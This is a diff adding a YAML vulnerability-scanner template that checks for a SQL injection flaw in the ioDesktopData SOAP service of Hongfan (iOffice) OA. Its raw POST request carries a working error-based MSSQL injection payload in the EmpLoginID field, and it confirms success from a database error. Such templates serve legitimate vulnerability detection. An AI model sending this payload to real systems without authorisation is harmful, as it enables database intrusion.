@@ -1,0 +1,42 @@
+id: poc-yaml-hongfan-oa-iodesktopdata-sqli
+info:
+  name: 红帆OA ioDesktopData SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: iOffice
+
+variables:
+  t1: "{{rand_int(1000,9999)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+        <soap:Header/>
+        <soap:Body>
+        <tem:GetDepSchedule>
+        <!--type: string-->
+        <tem:EmpLoginID>'+(SELECT CHAR(68)+CHAR(79)+CHAR(99)+CHAR(105) WHERE 5220=5220 AND 5581 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT SUBSTRING((ISNULL(CAST(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{t1}}')) AS NVARCHAR(4000)),CHAR(32))),1,1024))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(98)+CHAR(113))))+'</tem:EmpLoginID>
+        </tem:GetDepSchedule>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "nvarchar"
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
